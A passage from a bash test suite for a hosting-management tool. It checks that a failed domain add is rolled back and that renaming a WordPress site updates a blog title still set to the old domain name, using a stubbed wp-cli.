_wp_reset
assert_eq    "a user made by add and a run that dies"             0 "$(run_isolated _wp_failed_add)"
assert_eq    "the rollback step is the one that stops it first"   "lib_domain_user_drop 'wp_example' 'wp_example'" "$(cat "$_wp/steps")"
assert_has   "the account was made"                               "useradd " "$(_wp_calls)"
assert_eq    "and is gone after the rollback, group and all"      "" "$(_wp_left)"
assert_lacks "which reports no failed step"                       "rollback step failed" "$(cat "$_wp/said")"

unset -f _wp_probe _wp_hosts _wp_reset _wp_calls _wp_drop _wp_left _wp_nokill _wp_failed_add
lib_rollback_clear
lib_domain_state_reset

# =============================================================================
section "rename: a WordPress title that is still the old name follows the site"
# "add --wordpress" gives a site nobody named a title for its domain name as the title, and
# rename rewrote addresses only: the renamed site went on calling itself by the old name.
_rt="$TMP/rntitle"; mkdir -p "$_rt/home/new.example/public_html" "$_rt/state"
_rt_fn="$(declare -f lib_domain_wpcli_ensure)"; _rt_bin="$WPCLI_BIN"
WPCLI_BIN="$_rt/wp"
cat >"$_rt/wp" <<'EOF'
#!/bin/sh
# wp-cli, standing in: a title in a file, and what WordPress gives as its address
d="$(dirname "$0")"
printf 'wp %s\n' "$*" >>"$d/calls"
case "$*" in
  *"option get blogname"*)    [ ! -e "$d/deaf" ] || exit 1; cat "$d/title" 2>/dev/null ;;
  *"option get siteurl"*|*"option get home"*) cat "$d/address" 2>/dev/null ;;
  *"option update blogname"*) [ ! -e "$d/read-only" ] || exit 1
                              prev=""; for a in "$@"; do if [ "$prev" = blogname ]; then printf '%s\n' "$a" >"$d/title"; fi; prev="$a"; done ;;
esac
exit 0
EOF
chmod +x "$_rt/wp"
lib_domain_wpcli_ensure() { return 0; }
_rt_wp() {   # old name [dry]: the rewrite, for the site that is new.example by now
  lib_domain_state_reset
  D_DOMAIN="new.example"; D_IDENT="new_example"; D_USER="new_example"; D_GROUP="new_example"
  D_HOME="$_rt/home/new.example"; D_MODE="wordpress"; D_PHP="8.3"
  if [[ "${2:-}" == "dry" ]]; then OPT_DRY_RUN=1; fi
  _domain_rename_wp "$1" new.example >"$_rt/out" 2>&1
}
_rt_set()   { rm -f "$_rt/deaf" "$_rt/read-only" "$_rt/address"; : >"$_rt/calls"; : >"$_rt/out"; : >"$LOG_FILE"; printf '%s\n' "$1" >"$_rt/title"; }
_rt_title() { cat "$_rt/title"; }
_rt_said()  { cat "$_rt/out" "$LOG_FILE"; }   # what it printed, and what it noted in the log
_rt_calls() { grep -c 'option update blogname' "$_rt/calls" || true; }

_rt_set "old.example"
assert_eq    "a rename of a WordPress whose title is its old name"   0 "$(run_isolated _rt_wp old.example)"
assert_eq    "the title is the new name"                             "new.example" "$(_rt_title)"
assert_has   "it is said"                                            "its title was the old name, old.example; it is new.example now" "$(_rt_said)"
assert_has   "the title is changed as the site user, in its home"    "-u new_example -- env HOME=$_rt/home/new.example" "$(grep 'option update blogname' "$RUNUSER_LOG" | tail -n 1)"
assert_true  "after the addresses, and before the cache is flushed"  bash -c 's="$(grep -n "search-replace" "$1" | tail -n 1 | cut -d: -f1)"; t="$(grep -n "option update blogname" "$1" | cut -d: -f1)"; f="$(grep -n "cache flush" "$1" | cut -d: -f1)"; [ "$s" -lt "$t" ] && [ "$t" -lt "$f" ]' _ "$_rt/calls"
_rt_set "Old Example - the shop"
assert_eq    "a title somebody wrote"                                0 "$(run_isolated _rt_wp old.example)"
assert_eq    "stays as it is"                                        "Old Example - the shop|0" "$(_rt_title)|$(_rt_calls)"
assert_lacks "and nothing is said about it"                          "its title was" "$(_rt_said)"
_rt_set "www.old.example"
assert_eq    "one that only contains the old name stays too"         "0www.old.example|0" "$(run_isolated _rt_wp old.example)$(_rt_title)|$(_rt_calls)"
_rt_set "other.example"
assert_eq    "and so does another name"                              "0other.example|0" "$(run_isolated _rt_wp old.example)$(_rt_title)|$(_rt_calls)"
_rt_set ""
assert_eq    "no title at all: nothing to change"                    "0|0" "$(run_isolated _rt_wp old.example)|$(_rt_calls)"
_rt_set "old.example"; : >"$_rt/deaf"
assert_eq    "a WordPress that does not say its title is left alone" "0old.example|0" "$(run_isolated _rt_wp old.example)$(_rt_title)|$(_rt_calls)"
_rt_set "old.example"; : >"$_rt/read-only"
assert_eq    "a title that cannot be changed does not fail the rename" 0 "$(run_isolated _rt_wp old.example)"
assert_has   "it is said where to change it"                         "The title of the WordPress still says old.example (Settings > General changes it)" "$(_rt_said)"
assert_has   "and the addresses are reported as before"              "the addresses in its database now say new.example" "$(_rt_said)"
_rt_set "old.example"
assert_eq    "a dry run changes no title"                            "0old.example|0" "$(run_isolated _rt_wp old.example dry)$(_rt_title)|$(_rt_calls)"
# a site registered under a name that is no domain name: its title is the name its database gives
_rt_set "shop.example"; printf 'https://shop.example\n' >"$_rt/address"
assert_eq    "a site under a no-domain name, titled by the name its database gives" 0 "$(run_isolated _rt_wp shop_old)"
assert_eq    "gets the new name as its title"                        "new.example" "$(_rt_title)"
_rt_set "shop_old"; printf 'https://shop.example\n' >"$_rt/address"
assert_eq    "and so does one titled by the name it was registered under" "0new.example" "$(run_isolated _rt_wp shop_old)$(_rt_title)"
assert_has   "--no-search-replace leaves the title with the rest"    'if (( replace )); then' "$(grep -B3 '_domain_rename_wp "\$old"' "$ROOT/lib/rename.sh")"
assert_true  "what it says has its Turkish"                          grep -qF "'WordPress: its title was the old name, {1}; it is {2} now' '" "$ROOT/lib/lang.sh"
assert_true  "the warning too"                                       grep -qF "'The title of the WordPress still says {1} (Settings > General changes it)' '" "$ROOT/lib/lang.sh"

WPCLI_BIN="$_rt_bin"; eval "$_rt_fn"
unset -f _rt_wp _rt_set _rt_title _rt_calls _rt_said
lib_domain_state_reset

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
if (( FAIL > 0 )); then exit 1; fi
exit 0
